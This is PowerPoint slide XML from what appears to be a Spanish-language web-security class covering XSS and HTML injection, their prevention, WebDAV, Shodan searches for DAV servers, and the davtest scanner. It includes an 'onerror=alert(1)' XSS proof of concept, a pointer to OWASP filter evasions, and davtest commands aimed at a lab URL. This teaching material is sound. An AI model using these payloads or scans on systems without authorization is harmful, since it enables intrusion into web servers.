            </a:r>
            <a:r>
              <a:rPr lang="es-ES" sz="2000" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:highlight>
                  <a:srgbClr val="FFFFFF"/>
                </a:highlight>
                <a:latin typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              </a:rPr>
              <a:t>/</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-ES" sz="2000" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:highlight>
                  <a:srgbClr val="FFFFFF"/>
                </a:highlight>
                <a:latin typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              </a:rPr>
              <a:t>onerror</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-ES" sz="2000" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:highlight>
                  <a:srgbClr val="FFFFFF"/>
                </a:highlight>
                <a:latin typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              </a:rPr>
              <a:t>=</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-ES" sz="2000" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:highlight>
                  <a:srgbClr val="FFFFFF"/>
                </a:highlight>
                <a:latin typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              </a:rPr>
              <a:t>alert</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-ES" sz="2000" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:highlight>
                  <a:srgbClr val="FFFFFF"/>
                </a:highlight>
                <a:latin typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              </a:rPr>
              <a:t>(1)&gt;</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="342900" indent="-342900">
              <a:buFont typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="es-ES" sz="2000" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:highlight>
                  <a:srgbClr val="FFFFFF"/>
                </a:highlight>
                <a:latin typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              </a:rPr>
              <a:t>Evasiones: </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-ES" sz="2000" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:highlight>
                  <a:srgbClr val="FFFFFF"/>
                </a:highlight>
                <a:latin typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
                <a:hlinkClick r:id="rId3"/>
              </a:rPr>
              <a:t>enlace</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-ES" sz="2000" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:highlight>
                  <a:srgbClr val="FFFFFF"/>
                </a:highlight>
                <a:latin typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              </a:rPr>
              <a:t> OWASP</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="342900" indent="-342900">
              <a:buFont typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:endParaRPr lang="es-ES" sz="2000" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="3" name="Imagen 2">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{7BFB4D44-ACB5-466B-B960-1218D4FAFDD0}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvPicPr>
            <a:picLocks noChangeAspect="1"/>
          </p:cNvPicPr>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId4"/>
          <a:stretch>
            <a:fillRect/>
          </a:stretch>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="6096000" y="2309907"/>
            <a:ext cx="5577841" cy="1119093"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
      </p:pic>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="8" name="Imagen 7">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{30AED436-C6CC-4388-85D0-B21434952116}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvPicPr>
            <a:picLocks noChangeAspect="1"/>
          </p:cNvPicPr>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId5"/>
          <a:stretch>
            <a:fillRect/>
          </a:stretch>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="983432" y="3770552"/>
            <a:ext cx="8535591" cy="1314633"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
      </p:pic>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="12" name="Imagen 11">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{50600BC7-C58F-4F49-BF6B-703F559C89DB}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvPicPr>
            <a:picLocks noChangeAspect="1"/>
          </p:cNvPicPr>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId6"/>
          <a:stretch>
            <a:fillRect/>
          </a:stretch>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="5375920" y="5085185"/>
            <a:ext cx="4686954" cy="1228896"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
      </p:pic>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="5885627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435092" y="229220"/>
            <a:ext cx="8264525" cy="782637"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:pPr eaLnBrk="1" hangingPunct="1">
              <a:defRPr/>
            </a:pPr>
            <a:r>
              <a:rPr lang="es-ES" altLang="es-ES" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0070C0"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Práctica</a:t>
            </a:r>
            <a:endParaRPr lang="es-ES" dirty="0">
              <a:solidFill>
                <a:srgbClr val="0070C0"/>
              </a:solidFill>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="7171" name="Marcador de texto 4"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="body" sz="quarter" idx="10"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="1654793" y="1404378"/>
            <a:ext cx="9343950" cy="4248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a:buFont typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="es-ES" dirty="0"/>
              <a:t>Realizar todos los niveles de ataque de XSS del </a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="1143000" lvl="1" indent="-457200"/>
            <a:r>
              <a:rPr lang="es-ES" dirty="0"/>
              <a:t>DOM</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="1143000" lvl="1" indent="-457200"/>
            <a:r>
              <a:rPr lang="es-ES" dirty="0"/>
              <a:t>almacenado </a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="1143000" lvl="1" indent="-457200"/>
            <a:r>
              <a:rPr lang="es-ES" dirty="0"/>
              <a:t>y reflejado (busca información de cómo atacar el  reflejado)</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:endParaRPr lang="es-ES" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="4832223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ítulo 1"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="1671070" y="2492067"/>
            <a:ext cx="8208838" cy="936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 altLang="es-ES" sz="5000" dirty="0">
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:rPr>
              <a:t>Inyección HTML</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="31600022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20726" y="175014"/>
            <a:ext cx="8264525" cy="782637"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:pPr eaLnBrk="1" hangingPunct="1">
              <a:defRPr/>
            </a:pPr>
            <a:r>
              <a:rPr lang="es-ES" altLang="es-ES" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="accent1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Inyección HTML</a:t>
            </a:r>
            <a:endParaRPr lang="es-ES" dirty="0">
              <a:solidFill>
                <a:schemeClr val="accent1"/>
              </a:solidFill>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="7171" name="Marcador de texto 4"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="body" sz="quarter" idx="10"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="1775520" y="1304689"/>
            <a:ext cx="9343950" cy="4248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a:buFont typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="es-ES" dirty="0"/>
              <a:t>Métodos HTTP: GET, POST, PUT, DELETE, OPTIONS, …</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="457200" indent="-457200">
              <a:buFont typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="es-ES" dirty="0" err="1"/>
              <a:t>BasicAuth</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-ES" dirty="0"/>
              <a:t> vs </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-ES" dirty="0" err="1"/>
              <a:t>DigestAuth</a:t>
            </a:r>
            <a:endParaRPr lang="es-ES" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="457200" indent="-457200">
              <a:buFont typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="es-ES" dirty="0" err="1"/>
              <a:t>WebDAV</a:t>
            </a:r>
            <a:endParaRPr lang="es-ES" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="457200" indent="-457200">
              <a:buFont typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="es-ES" dirty="0"/>
              <a:t>Inyección HTML</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="1200150" lvl="1" indent="-457200">
              <a:buFont typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="es-ES" dirty="0"/>
              <a:t>Almacenada</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="1200150" lvl="1" indent="-457200">
              <a:buFont typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="es-ES" dirty="0"/>
              <a:t>Reflejada</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="457200" indent="-457200">
              <a:buFont typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="es-ES" dirty="0"/>
              <a:t>Prevención Inyección HTML</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="1200150" lvl="1" indent="-457200">
              <a:buFont typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="es-ES" dirty="0"/>
              <a:t>Validar entrada</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="1200150" lvl="1" indent="-457200">
              <a:buFont typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="es-ES" dirty="0"/>
              <a:t>Configurar bien el servidor web</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="1200150" lvl="1" indent="-457200">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31820793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20726" y="175014"/>
            <a:ext cx="8264525" cy="782637"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:pPr eaLnBrk="1" hangingPunct="1">
              <a:defRPr/>
            </a:pPr>
            <a:r>
              <a:rPr lang="es-ES" altLang="es-ES" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="accent1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Consulta DAV en </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-ES" altLang="es-ES" dirty="0" err="1">
                <a:solidFill>
                  <a:schemeClr val="accent1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>shodan</a:t>
            </a:r>
            <a:endParaRPr lang="es-ES" dirty="0">
              <a:solidFill>
                <a:schemeClr val="accent1"/>
              </a:solidFill>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="5" name="Imagen 4">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{D11F09D9-48E5-FC02-722B-5E2D56AEFBFB}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvPicPr>
            <a:picLocks noChangeAspect="1"/>
          </p:cNvPicPr>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId3"/>
          <a:stretch>
            <a:fillRect/>
          </a:stretch>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="5856417" y="957651"/>
            <a:ext cx="4355122" cy="4972639"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
      </p:pic>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="7" name="Imagen 6">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{FBD3C6EE-6939-3B3C-2995-1BA951F0AA20}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvPicPr>
            <a:picLocks noChangeAspect="1"/>
          </p:cNvPicPr>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId4"/>
          <a:stretch>
            <a:fillRect/>
          </a:stretch>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="431487" y="1665185"/>
            <a:ext cx="4649560" cy="831570"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
      </p:pic>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="22671504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err="1">
                <a:solidFill>
                  <a:srgbClr val="0070C0"/>
                </a:solidFill>
              </a:rPr>
              <a:t>davtest</a:t>
            </a:r>
            <a:endParaRPr lang="es-ES" dirty="0">
              <a:solidFill>
                <a:srgbClr val="0070C0"/>
              </a:solidFill>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="5" name="CuadroTexto 4">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{DAB95837-215B-8785-46E0-BD6215D310B0}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="744718" y="3904557"/>
            <a:ext cx="10404835" cy="957313"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="630555" indent="269875" algn="just">
              <a:lnSpc>
                <a:spcPct val="150000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="600"/>
              </a:spcBef>
            </a:pPr>
            <a:r>
              <a:rPr lang="es-ES" sz="1800" b="0" i="0" u="none" strike="noStrike" baseline="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="282828"/>
                </a:solidFill>
                <a:latin typeface="Roboto-Regular"/>
              </a:rPr>
              <a:t>Al consultar la URL vemos: </a:t>
            </a:r>
            <a:endParaRPr lang="es-ES" dirty="0">
              <a:solidFill>
                <a:srgbClr val="000000"/>
              </a:solidFill>
              <a:highlight>
                <a:srgbClr val="FFFFFF"/>
              </a:highlight>
              <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              <a:ea typeface="Yu Mincho" panose="02020400000000000000" pitchFamily="18" charset="-128"/>
              <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="630555" indent="269875" algn="just">
              <a:lnSpc>
                <a:spcPct val="150000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="600"/>
              </a:spcBef>
            </a:pP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2" name="Imagen 1" descr="Interfaz de usuario gráfica, Texto, Aplicación&#10;&#10;Descripción generada automáticamente">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{678E5AE3-97A4-335F-56D3-4C9E2ACA453A}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvPicPr>
            <a:picLocks noChangeAspect="1"/>
          </p:cNvPicPr>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId3"/>
          <a:stretch>
            <a:fillRect/>
          </a:stretch>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="7529660" y="2538538"/>
            <a:ext cx="3790950" cy="3689350"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
      </p:pic>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="6" name="CuadroTexto 5">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{20073B26-D027-2C56-BFA9-461AD5FFEF20}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="519697" y="974595"/>
            <a:ext cx="11169540" cy="923330"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="es-ES" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="282828"/>
                </a:solidFill>
                <a:latin typeface="Roboto-Regular"/>
              </a:rPr>
              <a:t>WebDAV</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-ES" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="282828"/>
                </a:solidFill>
                <a:latin typeface="Roboto-Regular"/>
              </a:rPr>
              <a:t> es un protocolo que nos permite </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-ES" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="282828"/>
                </a:solidFill>
                <a:latin typeface="Roboto-Regular"/>
              </a:rPr>
              <a:t>guardar archivos, editarlos, moverlos y compartirlos </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-ES" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="282828"/>
                </a:solidFill>
                <a:latin typeface="Roboto-Regular"/>
              </a:rPr>
              <a:t>en un servidor web, no necesitaremos utilizar otros protocolos de intercambio de archivos en red local o Internet, como Samba, FTP o NFS</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="1625787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err="1">
                <a:solidFill>
                  <a:srgbClr val="0070C0"/>
                </a:solidFill>
              </a:rPr>
              <a:t>davtest</a:t>
            </a:r>
            <a:endParaRPr lang="es-ES" dirty="0">
              <a:solidFill>
                <a:srgbClr val="0070C0"/>
              </a:solidFill>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="5" name="CuadroTexto 4">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{DAB95837-215B-8785-46E0-BD6215D310B0}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="207390" y="887980"/>
            <a:ext cx="10404835" cy="4404411"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="630555" indent="269875" algn="just">
              <a:lnSpc>
                <a:spcPct val="150000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="600"/>
              </a:spcBef>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1800" b="0" i="0" u="none" strike="noStrike" baseline="0" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="282828"/>
                </a:solidFill>
                <a:latin typeface="Roboto-Regular"/>
              </a:rPr>
              <a:t>wget</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1800" b="0" i="0" u="none" strike="noStrike" baseline="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="282828"/>
                </a:solidFill>
                <a:latin typeface="Roboto-Regular"/>
              </a:rPr>
              <a:t> -q -O - https://archive.kali.org/archive-key.asc | apt-key add</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="630555" indent="269875" algn="just">
              <a:lnSpc>
                <a:spcPct val="150000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="600"/>
              </a:spcBef>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="282828"/>
                </a:solidFill>
                <a:latin typeface="Roboto-Regular"/>
              </a:rPr>
              <a:t>apt update</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630555" indent="269875" algn="just">
              <a:lnSpc>
                <a:spcPct val="150000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="600"/>
              </a:spcBef>
            </a:pP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apt</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install</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davtest</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630555" indent="269875" algn="just">
              <a:lnSpc>
                <a:spcPct val="150000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="600"/>
              </a:spcBef>
            </a:pP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davtest</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err="1">
                <a:effectLst/>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
                <a:ea typeface="Yu Mincho" panose="02020400000000000000" pitchFamily="18" charset="-128"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>url</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-ES" sz="1800" dirty="0">
                <a:effectLst/>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
                <a:ea typeface="Yu Mincho" panose="02020400000000000000" pitchFamily="18" charset="-128"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-ES" sz="1800" dirty="0">
                <a:effectLst/>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
                <a:ea typeface="Yu Mincho" panose="02020400000000000000" pitchFamily="18" charset="-128"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:hlinkClick r:id="rId3"/>
              </a:rPr>
              <a:t>https://iescelia.org/ciberseguridad/</a:t>
            </a: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630555" indent="269875" algn="just">
              <a:lnSpc>
                <a:spcPct val="150000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="600"/>
              </a:spcBef>
            </a:pPr>
            <a:endParaRPr lang="es-ES" dirty="0">
              <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              <a:ea typeface="Yu Mincho" panose="02020400000000000000" pitchFamily="18" charset="-128"/>
              <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="630555" indent="269875" algn="just">
              <a:lnSpc>
                <a:spcPct val="150000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="600"/>
              </a:spcBef>
            </a:pP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630555" indent="269875" algn="just">
              <a:lnSpc>
                <a:spcPct val="150000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="600"/>
              </a:spcBef>
            </a:pP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a:p>
            <a:pPr marL="630555" indent="269875" algn="just">
              <a:lnSpc>
                <a:spcPct val="150000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="600"/>
              </a:spcBef>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1800" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:highlight>
                  <a:srgbClr val="FFFFFF"/>
                </a:highlight>
                <a:latin typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
                <a:ea typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              </a:rPr>
              <a:t>davtest</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1800" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:highlight>
                  <a:srgbClr val="FFFFFF"/>
                </a:highlight>
                <a:latin typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
                <a:ea typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              </a:rPr>
              <a:t> -</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url</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1800" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:highlight>
                  <a:srgbClr val="FFFFFF"/>
                </a:highlight>
                <a:latin typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
                <a:ea typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1800" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:highlight>
                  <a:srgbClr val="FFFFFF"/>
                </a:highlight>
